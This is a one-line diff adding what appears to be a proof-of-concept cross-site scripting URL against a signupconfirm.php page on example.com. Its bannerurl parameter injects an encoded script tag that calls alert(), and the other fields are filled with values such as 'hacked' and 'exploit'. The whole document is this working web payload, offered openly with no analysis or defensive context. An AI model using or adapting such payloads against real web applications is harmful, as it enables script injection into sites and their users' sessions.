@@ -1,0 +1,2 @@
+http://www.example.com/signupconfirm.php?name=indoushkax&login=hacked&pass=exploit&email=indoushka%40hotmail%2E.com&url=http%3A%2F%2F&bannerurl=&lt;script&gt;alert(213771818860)&lt;/script&gt;&submit=%C7%D6%DB%D8%20%E3%D1%C9%20%E6%C7%CD%CF%C9%20%E1%E1%C7%D4%CA%D1%C7%DF
+  
